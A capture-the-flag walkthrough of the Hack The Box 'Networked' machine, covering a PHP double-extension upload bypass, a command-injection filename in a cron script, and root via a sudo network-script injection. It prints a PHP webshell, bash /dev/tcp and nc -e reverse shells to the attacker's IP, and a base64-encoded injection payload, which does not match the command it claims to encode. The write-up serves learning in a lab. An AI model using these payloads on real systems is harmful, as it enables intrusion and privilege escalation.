# Networked [HTB](https://app.hackthebox.com/machines/203)
![networked-01]()


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 networked.htb
```

![ports-02]()


From here we can run a version detection scan againts the found ports:

```bash
nmap -p 22,80,443 -sCV networked.htb -oN nmap.result
```

![nmap-res-03]()

We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.6 server on port 80.


Based on nmap's probing scripts we can see that the Apache server is powered by php/5.4.16, and that the Target OS is probably CentOS. 


Let's take a closer look at this Apache server. 


### Apache Port 80

If we open the site at `http://networked.htb/` we get the following:

![site-04]()


This message doesn't really tell us much, and on the surface there isn't much to do in this page. 


But if take a look at the source code of this page we can see the following comment:

![src-comment-05]()


This comment hints at possible subdirectories. So I ran a directory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://networked.htb/FUZZ -e .cgi,.txt,.xml,.html,.php
```


![ffuf-06]()


Let's go over the results.


+ `index.php`

This is the main page of the site where the initial message was shown. 


+ `uploads`

This to me looks like a listing of a directory:

![empty-uploads-07]()


Typically, we should see another entry in a directory listing of `..` to represent the parent directory, but we don't see it here. Let's leave this directory alone for now and check the other ones. 


+ `photos.php`

Returns the following:

![photos-08]()


This doesn't tell us much. 


+ `lib.php`

Returns nothing, as can be seen from the `ffuf` scan. 


+ `backup`

This is the most interesting directory from the scan, which hosts a tar archive:

![backup-09]()


I downloaded the archive to my attack machine and listed it's contents:

```bash
tar tvf backup.tar
```

![list-archive-10]()


This looks like the source code for the previous entries.


I extracted the files into a dedicated directory:

```bash
mkdir backup && tar xvf backup.tar -C backup
```

Let's go over each file.


### Source Code Review


+ `lib.php`


Here is the contents of the file:

```php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}


?>
```


This script acts as a function library for the other scripts. 


It starts by defining two functions that are identical: `getnameCheck` and `getnameUpload`. Both take a filename as input, and return an array of the filename split into a prefix and extension based on the first `.` character. So if we input `cat.jpg` the functions will return an array of ['cat', 'jpg']. If we input a filename like this though: `cat.php.jpg`, the function will return ['cat', 'php.jpg'], this will be important later on.


Next comes the `check_ip` function, this function isn't really relevant. But in short, it verifies that the input filename has a valid ip address as it's prefix. This is done using the `filter_var()` php function.


Then the script defines two functions for checking the MIME type of the input `$file`: `file_mime_type` and `check_file_type`. The latter is a form of wrapper for the former, though this is also not super relevant either. This just tells us to make sure the file we upload has valid magic numbers that represent an image file. Achieving this is pretty trivial. 


Finally the `displayform` function defines the html form for the file upload.


The key takeaways from this script are the filename spliting, and the MIME type checks that will occure later on. 


+ `upload.php`


This is the script responsible for the file upload form, it reads as such:

```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

The script starts by loading `lib.php` and setting the `UPLOAD_DIR` variable to `/var/www/html/uploads`. Then, it checks if the file upload form has been submited, sets the uploaded file to the `$myFile` variable and starts the checks. 


The first check that runs is the `checks_file_type` function from `lib.php`, along with a file size check. So in order to succesfully upload a file we need the size of the file to be smaller then 60 Kb and the MIME type should indicate an `image/` file. 


Next, the script performs a file extension check using the `getnameUpload` function from `lib.php`. We know that the `getnameUpload` function treats everything after the first `.` character as the extension, so the extension of the input file `cat.php.jpg`, will be `php.jpg`. 


The actual extension check is performed using the `substr_compare` php function. This function takes two input parameters of `base_string` and a `sub_string` to look for inside `base_string`. There is also a third optional paramater which is the index of `base_string` to start the comparison from. We see in the script that the argument for the index is `-lenstr($vext)`, where `$vext` is the valid extension to look for. Therefore we can conclude that if we pass an extension of `jpg.php` it will fail, but `php.jpg` will pass the test. This will be important later on.  


If the input file passes all the tests, the script renames the file based on the source ip that submittedthe file uplaod. This is done using `$_SERVER['REMOTE_ADDE']` which is extracted from the connection socket to the Apache server. So if we input a file `cat.php.cat`, it will be saved as `10_10_14_101.php.jpg` into the `UPLOAD_DIR` with a permission set of `0644`.


So we can conclude that, we need to send a file smaller then 60Kb with proper image MIME magic numbers, the very end of the extension has to be one of these options: `jpg, jpeg, png, gif`, and the file will be saved as our client's ip address at `/var/www/html/uploads`.


Let's check the last script.


+ `photos.php`


This is the scirpt that displays all the uploded files at `var/www/html/uploads`, it reads as such:

```php
---[snip]---
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$ignored = array('.', '..', 'index.html');
$files = array();

$i = 1;
echo '<div class="tg-wrap"><table class="tg">'."\n";

foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;
  $files[$file] = filemtime($path. '/' . $file);
}
arsort($files);
$files = array_keys($files);

foreach ($files as $key => $value) {
  $exploded  = explode('.',$value);
  $prefix = str_replace('_','.',$exploded[0]);
  $check = check_ip($prefix,$value);
  if (!($check[0])) {
    continue;
  }
  // for HTB, to avoid too many spoilers
  if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
    continue;
  }
  if ($i == 1) {
    echo "<tr>\n";
  }

echo '<td class="tg-0lax">';
echo "uploaded by $check[1]<br>";
echo "<img src='uploads/".$value."' width=100px>";
echo "</td>\n";


  if ($i == 4) {
    echo "</tr>\n";
    $i = 1;
  } else {
    $i++;
  }
}
if ($i < 4 && $i > 1) {
    echo "</tr>\n";
}
?>
---[snip]---
```


The script starts by loading `lib.php` and defining the same upload direcotry of `/var/www/html/uploads/`as the `$path` variable, as well as some other variables which are less relevant. 


The script then iterates over the files in `$path` directory to sort them based on the latest modification date before performing a few checks. The main check is for the file's prefix to be a valid IP address. This is done via the `check_ip` function from `lib.php`, not super relevant. 


Then the script checks if the file's prefix starts with HTB's lab subnet of 10.10... and that the prefix matches our client's IP. If this check fails the script skips the current iteration and moves on to the next file without displaying our file. This is not super relevant either as of course the prefix will match our client's IP.


After passing all the checks, the script sources the files from the `uploads` directory using the `<img>` html tag, and displays them.  


All in all this script is not super useful to our exploit. 


### Exploit

Iv'e spent a lot of time reviewing the source code trying to find a vulnerability that will allow us to upload a web/reverse shell to the system. Unfortunately, it's not so simple, and personally I didn't find any clear cut file upload vulnerabilities.


The script imploys checks for MIME types, which we can bypass alright, but there is a file extension check that I thought will restrict the execution of any php files. As the file extension check at `upload.php` makes sure that the very end of the file extension ends as either one of the following extensions `jpg, jpeg, png, gif`, therefore how will the web server render our uploaded file as php? 



I think that the answer in 99% of cases is: it won't, but in this case it does. 


Let's start by using the application in it's intended functionality. The first step is to find a valid iamge file to upload. We can use the following python code to generate a PNG image with proper magic numbers:

```python
from PIL import Image
img = Image.new('RGB', (320,320), color='black')
img.save('empty.png')
quit()
```

After running the script, we can use `xxd` to verify that the file does have the proper PNG header magic numbers:

![magic-png-11]()


This file should pass all checks imposed by the application, let's try to upload it:

![uploaded-12]()


Great, let's check the `photos.php`: 

![gallery-13]()


If we visit `http://networked.htb/uploads/10_10_14_101.png` we can get the file directly as well.


In the nextstep, we inject some php code into the file:


```php
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
```

![inject-14]()


This should break the image rendering completely, but if the file get's rendered as php it should give us a simple webshell.


Let's upload the file as `empty.php.png`, and try to access it at `http://networked.htb/uploads/10_10_14_101.png` 

![broken-15]()


The iamge cannot be disaplyed, and understandably so. But if we add the `?cmd=id` argument we get the following:

![id-16]()


What? why? 


In short, the issue is not with the application itself, but rather a misconfiguration in the Apache server which instructs it to render any file that has the string `php` in it's name as a valid php file regardless of the location of the string. So `10_10_14_101.php.png` get's interpreted as a php file by the misconfigured Apache even though it actully ends with `png` and therefore should be rendered as such.  


The issue with the application is the mistreatment of the input filename's extension. Instead of finding the last occurence of the `.` character in the filename and treating everything after it as the true extension, it find the first occurence of the `.` character and treats the rest of the filename as the extension. Therefore filenames like `empty.php.png` get saved as `10_10_14_14.php.png` which enables the Apache vulnerability. 



From here we can setup a local listener with:

```bash
rlwrap nc -lnvp 9001
```


Then url-encode the following reverse shell payload `bash -i >& /dev/tcp/10.10.14.101/9001 0>&1` and send it in a request like this: `http://networked.htb/uploads/10_10_14_101.php.png?cmd=<payload>` and get a shell:


![shell-17]()


## Privilege Escalation


When we land on the machine we get access as the `apache` service account. So if we check the content's of the `/home` directory we can see the following:

![home-18]()


There is another user on the system named `guly` and we have read access to he's home directory, let's cehck what's inside:

![guly-home-19]()


We can see two interesting files in `crontab.guly` and `check_attack.php`, let's read them.

+ `crontab.guly`

The file reads as such:

![guly-cron-20]()


We can see that the `check_attack.php` script is run every 1/3 minutes via this cron job. 


+ `check_attack.php`


The file reads as such:

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```


Notice the `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` near the end? There is an obvious command injection from the `$value` varaible. This value get's generated when the script iterates over the files at `/var/www/html/uploads`, so if we plant a file named like this: `a; nc -e /bin/bash 10.10.14.101 9001` we should get a shell back as `guly`.


The issue is that creating files like that result in a `No such file or directory` error. To circumvent this we can use a common trick which is encoding the payload. 


So for example if we `base64` encode the payload we will get:

```bash
echo nc -e /bin/bash 10.10.14.101 9001 | base64 -w0
```

![encode-21]()


Now we can create a file like this:

```bash
touch 'a; echo "YmFzaCAtaSAvZGV2L3RjcC8xMC4xMC4xNC4xMDEgOTAwOSAwPiYxCg==" | base64 -d | sh; b'
```

![touch-22]()


Then we can setup the local listener with:

```bash
rlwrap nc -lnvp 9009
```


After a couple of seconds we get a shell as `guly`:

![guly-shell-23]()


### Guly

After landing on a shell as `guly` I spwan a TTY shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Next, I run `sudo -l` to list any sudo permissions `guly` has:

![sudo-24]()


We can see that `guly` can run the `/usr/local/sbin/changename.sh` bash script as root without supplying a password. The script reads as such:


```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

I wasn't sure what to make of this script, other then it writes some interface parameters into `/etc/sysconfig/network-scripts/ifcfg-guly` and then tries to bring the interface up with `/sbin/ifup guly0`.


So I tried running the script:

![run-25]()


Did the script just try to run my input as a command? 


Lets try to input `/bin/bash`:

![root-26]


Why this happens? 


Anything after a space in a an argument to a network script gets executed. THis issue has been documented [here](https://seclists.org/fulldisclosure/2019/Apr/24). 
